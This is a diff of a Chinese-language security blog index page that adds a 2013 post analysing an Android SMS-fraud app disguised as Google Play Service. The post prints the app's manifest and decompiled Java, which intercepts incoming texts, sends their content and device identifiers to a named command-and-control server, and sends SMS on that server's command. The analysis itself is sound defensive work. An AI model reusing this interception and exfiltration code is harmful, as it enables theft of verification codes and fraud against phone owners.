@@ -9,7 +9,8 @@
   <meta name="author" content="dm4">
 
   
-  <meta name="description" content="拖超久的 writeup ，感謝一起玩的 217 大大們，下面整理了一些大大們的解法，和從各處搜括來的 writeup BIN100 擲骰子要丟出指定的順序，不過最後一個是 7 ，所以 patch 一下判斷數字的 je/jne 就可以了。 Reference http://balidani. &hellip;">
+  <meta name="description" content="最近好像很流行收到這種奇怪的簡訊 用 iPhone 點開網址之後發現會被導到一個已經關閉的無名相簿，研究了一下發現他會判斷 User-Agent 來決定要導到哪裡，
+如果把 User-Agent 設成 Android 瀏覽器的話，會被導到一個下載 Andorid apk 的連結 &hellip;">
   
 
   <!-- http://t.co/dKP3o1e -->
@@ -35,7 +36,8 @@
 <meta property="og:title" content="blog.dm4.tw" />
 <meta property="og:site_name" content="blog.dm4.tw" />
 <meta property="og:url" content="http://blog.dm4.tw/" />
-<meta property="og:description" content="拖超久的 writeup ，感謝一起玩的 217 大大們，下面整理了一些大大們的解法，和從各處搜括來的 writeup BIN100 擲骰子要丟出指定的順序，不過最後一個是 7 ，所以 patch 一下判斷數字的 je/jne 就可以了。 Reference http://balidani.blogspot.hu/2013/08/ebctf-bin100-300-write-up.html &hellip;" />
+<meta property="og:description" content="最近好像很流行收到這種奇怪的簡訊 用 iPhone 點開網址之後發現會被導到一個已經關閉的無名相簿，研究了一下發現他會判斷 User-Agent 來決定要導到哪裡，
+如果把 User-Agent 設成 Android 瀏覽器的話，會被導到一個下載 Andorid apk 的連結 不過大概是新聞報很大的原因，詐騙連結幾乎都已經失效了 把載下來的 apk 拆開會發現它是一個偽裝成 Google &hellip;" />
 <meta property="og:image" content="http://www.gravatar.com/avatar/1b0b7bab4c837d80e1b110bd7127a0d8?s=200" />
 <meta property="og:type" content="website" />
 
@@ -87,6 +89,352 @@
     <div id="content">
       <div class="blog-index">
   
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2013/11/09/xiao-e-fu-fei-jian-xun-zha-pian/">小額付費簡訊詐騙</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-11-09T12:22:00+08:00" pubdate data-updated="true">Nov 9<span>th</span>, 2013</time>
+        
+           | <a href="/blog/2013/11/09/xiao-e-fu-fei-jian-xun-zha-pian/#disqus_thread"
+             data-disqus-identifier="http://blog.dm4.tw/blog/2013/11/09/xiao-e-fu-fei-jian-xun-zha-pian/">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>最近好像很流行收到這種奇怪的簡訊</p>
+
+<p><a href="http://www.flickr.com/photos/51077287@N06/10746549465/" title="Flickr 上 sunrisedm4 的 詐騙簡訊"><img src="http://farm3.staticflickr.com/2835/10746549465_c046942cc1.jpg" width="333" height="500" alt="詐騙簡訊"></a></p>
+
+<p>用 iPhone 點開網址之後發現會被導到一個已經關閉的無名相簿，研究了一下發現他會判斷 <code>User-Agent</code> 來決定要導到哪裡，
+如果把 <code>User-Agent</code> 設成 Android 瀏覽器的話，會被導到一個下載 Andorid apk 的連結</p>
+
+<p>不過大概是新聞報很大的原因，詐騙連結幾乎都已經失效了</p>
+
+<p>把載下來的 apk 拆開會發現它是一個偽裝成 Google Play Service 的程式
+（要拆 apk 推薦使用 <a href="http://code.google.com/p/androguard/">androguard</a> ，它的 Sublime Text plugin 簡直是神器&hellip;&hellip;）</p>
+
+<p>使用到的權限和用到的 components</p>
+
+<div><script src='https://gist.github.com/c392ca89782e53ce7915.js?file=AndroidManifest.xml'></script>
+<noscript><pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;
+&lt;manifest android:versionCode=&quot;1&quot; android:versionName=&quot;1.0&quot; package=&quot;com.google.android.gmss&quot; xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt;
+    &lt;uses-sdk android:minSdkVersion=&quot;4&quot; android:targetSdkVersion=&quot;17&quot;&gt;&lt;/uses-sdk&gt;
+    &lt;uses-permission android:name=&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot;&gt;&lt;/uses-permission&gt;
+    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;&gt;&lt;/uses-permission&gt;
+    &lt;uses-permission android:name=&quot;android.permission.RECEIVE_SMS&quot;&gt;&lt;/uses-permission&gt;
+    &lt;uses-permission android:name=&quot;android.permission.SEND_SMS&quot;&gt;&lt;/uses-permission&gt;
+    &lt;uses-permission android:name=&quot;android.permission.WRITE_SMS&quot;&gt;&lt;/uses-permission&gt;
+    &lt;uses-permission android:name=&quot;android.permission.READ_SMS&quot;&gt;&lt;/uses-permission&gt;
+    &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot;&gt;&lt;/uses-permission&gt;
+    &lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot;&gt;&lt;/uses-permission&gt;
+    &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot;&gt;&lt;/uses-permission&gt;
+    &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;&gt;&lt;/uses-permission&gt;
+    &lt;uses-permission android:name=&quot;android.permission.CALL_PHONE&quot;&gt;&lt;/uses-permission&gt;
+    &lt;uses-permission android:name=&quot;android.permission.PROCESS_OUTGOING_CALLS&quot;&gt;&lt;/uses-permission&gt;
+    &lt;application android:allowBackup=&quot;true&quot; android:icon=&quot;@7F020002&quot; android:label=&quot;@7F050000&quot; android:theme=&quot;@7F060001&quot;&gt;
+        &lt;activity android:label=&quot;&quot; android:name=&quot;com.google.android.gmss.MainActivity&quot;&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name=&quot;android.intent.action.MAIN&quot;&gt;
+                &lt;/action&gt;
+                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;&gt;
+                &lt;/category&gt;
+            &lt;/intent-filter&gt;
+        &lt;/activity&gt;
+        &lt;receiver android:name=&quot;com.google.android.gmss.BootBroadcastReceiver&quot;&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot;&gt;
+                &lt;/action&gt;
+            &lt;/intent-filter&gt;
+        &lt;/receiver&gt;
+        &lt;service android:exported=&quot;true&quot; android:label=&quot;@7F050000&quot; android:name=&quot;com.google.android.gmss.MouseCave&quot;&gt;
+        &lt;/service&gt;
+        &lt;receiver android:name=&quot;com.google.android.gmss.MouseEar&quot;&gt;
+            &lt;intent-filter android:priority=&quot;2147483647&quot;&gt;
+                &lt;action android:name=&quot;android.provider.Telephony.SMS_RECEIVED&quot;&gt;
+                &lt;/action&gt;
+                &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;&gt;
+                &lt;/category&gt;
+            &lt;/intent-filter&gt;
+        &lt;/receiver&gt;
+        &lt;receiver android:name=&quot;com.google.android.gmss.MouseNose&quot;&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name=&quot;android.intent.action.NEW_OUTGOING_CALL&quot;&gt;
+                &lt;/action&gt;
+            &lt;/intent-filter&gt;
+        &lt;/receiver&gt;
+        &lt;receiver android:name=&quot;com.google.android.gmss.BlackCat&quot;&gt;
+            &lt;intent-filter&gt;
+                &lt;action android:name=&quot;com.mouse.BlackCat&quot;&gt;
+                &lt;/action&gt;
+            &lt;/intent-filter&gt;
+        &lt;/receiver&gt;
+    &lt;/application&gt;
+&lt;/manifest&gt;
+</code></pre></noscript></div>
+
+
+<p>可以看到這個 app 要了一些邪惡的權限，
+並且有個 receiver 會偵測 <code>android.provider.Telephony.SMS_RECEIVED</code> 這個動作，
+在收到簡訊的時候被觸發，是和小額付費比較有相關的地方</p>
+
+<div><script src='https://gist.github.com/c392ca89782e53ce7915.js?file=me.java'></script>
+<noscript><pre><code>package com.google.android.gmss;
+public class MouseEar extends android.content.BroadcastReceiver {
+    // ...
+            if(v3[v2].getMessageBody().toString().contains(&quot;*#060#&quot;) == 0) {
+                if(com.google.android.gmss.c.a(p8) != 0) {
+                    this.abortBroadcast();
+                    v1 = new java.util.HashMap();
+                    v1.put(&quot;type&quot;, &quot;1&quot;);
+                    v1.put(&quot;source&quot;, v3[v2].getOriginatingAddress().toString());
+                    v1.put(&quot;content&quot;, v3[v2].getMessageBody().toString());
+                    new Thread(new com.google.android.gmss.h(this, v1, p8)).start();
+                }
+            } else {
+                this.abortBroadcast();
+                v1 = v3[v2].getOriginatingAddress();
+                v4 = v3[v2].getMessageBody().substring(6);
+                v5 = new java.util.HashMap();
+                v5.put(&quot;phone_id&quot;, v4);
+                v5.put(&quot;phone_num&quot;, v1);
+                new Thread(new com.google.android.gmss.g(this, v5, p8)).start();
+            }
+    // ...
+}
+</code></pre></noscript></div>
+
+
+<p>可以看到在收到新簡訊的時候，會判斷內容有沒有包括特定字串，
+有的話就會把整個簡訊內容回傳，如果沒有的話只會回傳前六個字元</p>
+
+<p>再往下追可以找到回報資料的伺服器位置和一些東西，不過當然也失效了</p>
+
+<div><script src='https://gist.github.com/c392ca89782e53ce7915.js?file=l.java'></script>
+<noscript><pre><code>package com.google.android.gmss;
+public class l {
+    static String a;
+    static String c;
+    static String b;
+    static String e;
+    static String d;
+    static String g;
+    static String f;
+    static String i;
+    static String h;
+    static java.util.List j;
+    static l()
+    {
+        com.google.android.gmss.l.a = &quot;http://googleapp.leitungsen.de:1652/&quot;;
+        com.google.android.gmss.l.b = new StringBuilder(String.valueOf(com.google.android.gmss.l.a)).append(&quot;index.php/Backdoor/submit&quot;).toString();
+        com.google.android.gmss.l.c = new StringBuilder(String.valueOf(com.google.android.gmss.l.a)).append(&quot;index.php/Backdoor/deploy_report&quot;).toString();
+        com.google.android.gmss.l.d = new StringBuilder(String.valueOf(com.google.android.gmss.l.a)).append(&quot;index.php/Backdoor/task_query&quot;).toString();
+        com.google.android.gmss.l.e = new StringBuilder(String.valueOf(com.google.android.gmss.l.a)).append(&quot;index.php/Backdoor/get_blockrules&quot;).toString();
+        com.google.android.gmss.l.f = new StringBuilder(String.valueOf(com.google.android.gmss.l.a)).append(&quot;index.php/Backdoor/phones_query&quot;).toString();
+        com.google.android.gmss.l.g = new StringBuilder(String.valueOf(com.google.android.gmss.l.a)).append(&quot;index.php/Backdoor/phone_num_submit&quot;).toString();
+        com.google.android.gmss.l.h = new StringBuilder(String.valueOf(com.google.android.gmss.l.a)).append(&quot;index.php/Backdoor/get_url&quot;).toString();
+        com.google.android.gmss.l.i = &quot;c84258e9c39059a89ab77d846ddab909&quot;;
+        com.google.android.gmss.l.j = new java.util.ArrayList();
+        return;
+    }
+    public static com.google.android.gmss.p a(java.util.HashMap p6, int p7, android.content.Context p8)
+    {
+        switch(p7) {
+            case 0:
+                v2 = com.google.android.gmss.l.b;
+                break;
+            case 1:
+                v2 = com.google.android.gmss.l.c;
+                break;
+            case 2:
+                v2 = com.google.android.gmss.l.d;
+                break;
+            case 3:
+                v2 = com.google.android.gmss.l.e;
+                break;
+            case 4:
+                v2 = com.google.android.gmss.l.f;
+                break;
+            case 5:
+                v2 = com.google.android.gmss.l.g;
+                break;
+            case 6:
+                v2 = com.google.android.gmss.l.h;
+                break;
+            default:
+                v2 = &quot;&quot;;
+        }
+        v0 = p8.getSystemService(&quot;phone&quot;);
+        v3 = new java.util.ArrayList();
+        if(p6 == 0) {
+            p6 = new java.util.HashMap();
+        }
+        if(v0.getLine1Number().length() == 0) {
+            p6.put(&quot;target_id&quot;, v0.getDeviceId());
+        } else {
+            p6.put(&quot;target_id&quot;, v0.getLine1Number());
+        }
+        p6.put(&quot;user_id&quot;, com.google.android.gmss.l.i);
+        v4 = p6.keySet().iterator();
+        while (v4.hasNext() != 0) {
+            v0 = v4.next();
+            v3.add(new org.apache.http.message.BasicNameValuePair(v0, p6.get(v0)));
+        }
+        v0 = new com.google.android.gmss.p();
+        v0.b = v3;
+        v0.c = 0;
+        v0.a = v2;
+        v1 = com.google.android.gmss.l.j;
+        synchronized(v1) {
+            com.google.android.gmss.l.j.add(v0);
+        }
+        if(com.google.android.gmss.m.a(p8) != 0) {
+            com.google.android.gmss.l.a();
+        }
+        return v0;
+    }
+    public static void a()
+    {
+        v2 = com.google.android.gmss.l.j;
+        synchronized(v2) {
+            v1 = (com.google.android.gmss.l.j.size() - 1);
+            while (v1 &gt;= 0) {
+                v0 = com.google.android.gmss.l.j.get(v1);
+                v3 = new org.apache.http.client.methods.HttpPost(v0.a);
+                android.util.Log.i(&quot;HttpController&quot;, v0.a);
+                v3.setEntity(new org.apache.http.client.entity.UrlEncodedFormEntity(v0.b, &quot;UTF-8&quot;));
+                v3 = new org.apache.http.impl.client.DefaultHttpClient().execute(v3);
+                if(v3.getStatusLine().getStatusCode() != 200) {
+                    v0.d = new StringBuilder(&quot;Error Response&quot;).append(v3.getStatusLine().toString()).toString();
+                } else {
+                    v0.d = org.apache.http.util.EntityUtils.toString(v3.getEntity());
+                }
+                v0.c = 1;
+                com.google.android.gmss.l.j.remove(v1);
+                v1 = (v1 - 1);
+            }
+        }
+        return;
+    }
+    public static void a(android.content.Context p4)
+    {
+        v0 = com.google.android.gmss.l.a(0, 6, p4);
+        v0.a();
+        android.util.Log.i(&quot;ret&quot;, v0.d);
+        if(v0.d.length() &gt; 0) {
+            v0 = new org.json.JSONArray(v0.d).getJSONObject(0);
+            v1 = new android.content.Intent();
+            v1.setAction(&quot;android.intent.action.VIEW&quot;);
+            v0 = v0.getString(&quot;msg_body&quot;);
+            if(v0.contains(&quot;http://&quot;) == 0) {
+                v0 = new StringBuilder(&quot;http://&quot;).append(v0).append(&quot;/&quot;).toString();
+            }
+            v1.setData(android.net.Uri.parse(v0));
+            p4.startActivity(v1);
+        }
+        return;
+    }
+    public static void a(String p12, android.content.Context p13)
+    {
+        v3 = new org.json.JSONArray(p12);
+        v4 = v3.length();
+        v2 = 0;
+        while (v2 &lt; v4) {
+            v0 = v3.getJSONObject(v2);
+            v5 = v0.getString(&quot;recipient&quot;);
+            v6 = v0.getString(&quot;msg_body&quot;);
+            v5.trim();
+            v5 = v5.split(&quot;;&quot;);
+            v7 = v5.length;
+            v0 = 0;
+            while (v0 &lt; v7) {
+                v8 = v5[v0];
+                android.util.Log.i(&quot;MSG&quot;, new StringBuilder(&quot;num: &quot;).append(v8).append(&quot;, msg_bdy:&quot;).append(v6).toString());
+                com.google.android.gmss.l.a(v8, v6, p13);
+                v0 = (v0 + 1);
+            }
+            v2 = (v2 + 1);
+        }
+        return;
+    }
+    public static void a(String p7, String p8, android.content.Context p9)
+    {
+        v0 = android.telephony.SmsManager.getDefault();
+        if(p8.length() &lt;= 70) {
+            v0.sendTextMessage(p7, 0, p8, 0, 0);
+        } else {
+            v6 = v0.divideMessage(p8).iterator();
+            while (v6.hasNext() != 0) {
+                v0.sendTextMessage(p7, 0, v6.next(), 0, 0);
+            }
+        }
+        return;
+    }
+    public static String b()
+    {
+        return new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(String.valueOf(new StringBuilder(&quot;Product: &quot;).append(android.os.Build.PRODUCT).toString())).append(&quot;\x0aCPU_ABI: &quot;).append(android.os.Build.CPU_ABI).toString())).append(&quot;\x0aTAGS: &quot;).append(android.os.Build.TAGS).toString())).append(&quot;\x0aVERSION_CODES.BASE: 1&quot;).toString())).append(&quot;\x0aMODEL: &quot;).append(android.os.Build.MODEL).toString())).append(&quot;\x0aSDK: &quot;).append(android.os.Build$VERSION.SDK).toString())).append(&quot;\x0aVERSION.RELEASE: &quot;).append(android.os.Build$VERSION.RELEASE).toString())).append(&quot;\x0aDEVICE: &quot;).append(android.os.Build.DEVICE).toString())).append(&quot;\x0aDISPLAY: &quot;).append(android.os.Build.DISPLAY).toString())).append(&quot;\x0aBRAND: &quot;).append(android.os.Build.BRAND).toString())).append(&quot;\x0aBOARD: &quot;).append(android.os.Build.BOARD).toString())).append(&quot;\x0aFINGERPRINT: &quot;).append(android.os.Build.FINGERPRINT).toString())).append(&quot;\x0aID: &quot;).append(android.os.Build.ID).toString())).append(&quot;\x0aMANUFACTURER: &quot;).append(android.os.Build.MANUFACTURER).toString())).append(&quot;\x0aUSER: &quot;).append(android.os.Build.USER).toString();
+    }
+    public static void b(android.content.Context p6)
+    {
+        v2 = com.google.android.gmss.c.a(p6).b();
+        if(v2.size() != 0) {
+            v3 = p6.getSystemService(&quot;phone&quot;).getDeviceId();
+            android.util.Log.i(&quot;SMS Reporter&quot;, &quot;Send SMS report&quot;);
+            v1 = 0;
+            while (v1 &lt; v2.size()) {
+                com.google.android.gmss.l.a(v2.get(v1), new StringBuilder(&quot;*#060#&quot;).append(v3).toString(), p6);
+                v1 = (v1 + 1);
+            }
+        }
+        return;
+    }
+    public static void c(android.content.Context p3)
+    {
+        if(com.google.android.gmss.m.a(p3) != 0) {
+            com.google.android.gmss.c.a(p3).a();
+            v0 = com.google.android.gmss.l.a(0, 2, p3);
+            v0.a();
+            if(v0.d.length() != 0) {
+                android.util.Log.i(&quot;ret&quot;, v0.d);
+                com.google.android.gmss.l.a(v0.d, p3);
+            }
+        }
+        return;
+    }
+}
+</code></pre></noscript></div>
+
+
+<p>裝了惡意程式之後會莫名其妙的被盜用小額付費的原因，
+我<strong>猜</strong>應該是小額付費的認證簡訊會包含特定內容，把整封簡訊回傳是為了要拿到小額付費的認證碼，
+如果不是小額付費的簡訊，這隻惡意程式會回傳前六個字元的原因，
+我<strong>猜</strong>可能是覺得簡訊一開頭很有可能有人名吧，
+一但拿到人名 + 電話，就又多了一個詐騙的目標&hellip;&hellip;</p>
+</div>
+  
+  
+
+
+    </article>
   
   
     <article>
@@ -1350,48 +1698,9 @@ export PATH="$PERLBREW_PATH:$PATH_WITHOUT_PERLBREW"
 
     </article>
   
-  
-    <article>
-      
-  <header>
-    
-      <h1 class="entry-title"><a href="/blog/2012/05/08/first-post/">First Post</a></h1>
-    
-    
-      <p class="meta">
-        
-
-
-
-
-
-
-
-
-  
-
-
-<time datetime="2012-05-08T00:27:00+08:00" pubdate data-updated="true">May 8<span>th</span>, 2012</time>
-        
-           | <a href="/blog/2012/05/08/first-post/#disqus_thread"
-             data-disqus-identifier="http://blog.dm4.tw/blog/2012/05/08/first-post/">Comments</a>
-        
-      </p>
-    
-  </header>
-
-
-  <div class="entry-content"><p>聽說很潮來用一下傳說中的 octopress</p>
-
-<p>本來覺得不會 ruby 怕怕的，可是還是忍不住想試試看用 <a href="http://markdown.tw">Markdown</a> 寫 blog 的感覺，一試之下才發現……也太方便了吧！</p>
-</div>
-  
-  
-
-
-    </article>
-  
   <div class="pagination">
+    
+      <a class="prev" href="/blog/page/2/">&larr; Older</a>
     
     <a href="/blog/archives">Blog Archives</a>
     
@@ -1402,6 +1711,10 @@ export PATH="$PERLBREW_PATH:$PATH_WITHOUT_PERLBREW"
     <section>
   <h1>Recent Posts</h1>
   <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2013/11/09/xiao-e-fu-fei-jian-xun-zha-pian/">小額付費簡訊詐騙</a>
+      </li>
     
       <li class="post">
         <a href="/blog/2013/11/08/ebctf-2013-writeup/">ebCTF 2013 Writeup</a>
@@ -1429,10 +1742,6 @@ export PATH="$PERLBREW_PATH:$PATH_WITHOUT_PERLBREW"
     
       <li class="post">
         <a href="/blog/2012/07/22/hitcon-2012-wargame-notes/">HITCON 2012 Wargame Notes</a>
-      </li>
-    
-      <li class="post">
-        <a href="/blog/2012/05/11/dot-bashrc-sourced-twice/">.bashrc Sourced Twice</a>
       </li>
     
   </ul>
